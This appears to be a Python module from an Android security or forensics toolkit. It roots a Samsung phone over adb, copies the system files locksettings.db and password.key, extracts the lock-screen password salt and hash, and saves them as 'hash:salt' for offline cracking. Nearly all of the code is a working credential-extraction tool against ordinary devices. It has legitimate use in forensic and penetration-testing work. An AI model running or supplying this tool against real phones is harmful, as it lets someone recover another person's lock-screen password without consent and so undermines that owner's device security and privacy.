from adb.adb import ADB
import re
import sys
import string
import printer
import ConfigParser
from collections import namedtuple
from binascii import *
from sandutils import *
import os
import sqlite3

class SandGetPasswordHash:

   def __init__(self, printer, config, project, adb_path="adb"):
      self.printer=printer
      self.config=config
      self.project=project
      self.params={"adbpath":{"description":"Path of the adb command",
			      "value":adb_path,
			      "required":True
			      },
		  "phonewithos":{"description":"The samsung hardware and the android version",
			      "value":"GT-I9505 4.2.2",
			      "required":True
			      },
		  "out_dir":{"description":"Where to generate the results and download files on the computer.",
			      "value":"results",
			      "required":True
			      },
		  }
      self.setparams(self.params)
      self.salt=""
      self.hash=""

   def setparams(self, params):
      self.params=params
      self.adb = ADB(self.params["adbpath"]["value"])
      self.phone = self.params["phonewithos"]["value"]
      self.out_dir = self.params["out_dir"]["value"]

   def getparams(self):
      return self.params

   def get_salt(self):
      self.printer.print_debug("Check for su!")
      su=checkforsu(self.adb)
      if (su==""):
         self.printer.print_err("The su comand was not found, hope the phone in a recovery with root access!")
         su=""

      ''' Download locksettings.db '''
      self.printer.print_info("Downloading the locksettings.db-shm file...")
      get_file(self.printer,self.adb,su,"/data/system/locksettings.db-shm","%s/%s_locksettings.db-shm" % (self.out_dir, self.project))    
      self.printer.print_ok("Download - Done")   

      self.printer.print_info("Downloading the locksettings.db-wal file...")
      get_file(self.printer,self.adb,su,"/data/system/locksettings.db-wal","%s/%s_locksettings.db-wal" % (self.out_dir, self.project))      
      self.printer.print_ok("Download - Done")

      self.printer.print_info("Downloading the locksettings.db file...")
      get_file(self.printer,self.adb,su,"/data/system/locksettings.db","%s/%s_locksettings.db" % (self.out_dir, self.project))    
      self.printer.print_ok("Download - Done")

      ''' Extract the salt from the sqlite database '''
      try:
         database = "%s/%s_locksettings.db" % (self.out_dir, self.project)
         con = sqlite3.connect(database)
         cur = con.cursor()    
         cur.execute("SELECT value FROM locksettings WHERE name = 'lockscreen.password_salt'")
         data = cur.fetchone()
         self.salt=data[0]
      except Exception as error:
         self.printer.print_err("Could not extract the hash from the sqlite database: %d" % error.returncode)
         self.printer.print_err(error.output)
         return -1

   def get_hash(self):
      self.printer.print_info("Check for su!")
      su=checkforsu(self.adb)
      if (su==""):
         self.printer.print_err("The su comand was not found, hope the phone in a recovery with root access!")
         su=""      
      
      self.printer.print_info("Downloading the password.key file...")
      get_file(self.printer,self.adb,su,"/data/system/password.key","%s/%s_password.key" % (self.out_dir, self.project)) 
      self.printer.print_ok("Download - Done")

      '''Extract the hash from password.key file'''
      filename = "%s/%s_password.key" % (self.out_dir, self.project)
      infile = open(filename, 'r')
      self.hash = infile.readline()

   def dump_hash(self):
      self.get_salt()
      self.get_hash()
      buff = "%s:%s\n" % (self.hash, self.salt)
      '''FORMAT: hash:salt '''
      self.printer.print_info("Writing the salt and the hash to the following file: %s/%s_pwdhash" % (self.out_dir, self.project))
      try:
         f=open("%s/%s_pwdhash" % (self.out_dir, self.project),"wb")
         try:
            f.write(buff)
         finally:
            f.close()
      except IOError as e:
         self.printer.print_err("I/O error({0}): {1} {2}/{3}_pwdhash".format(e.errno, e.strerror, self.out_dir, self.project))
         return -1

      self.printer.print_ok("Write - Done")

      return 1
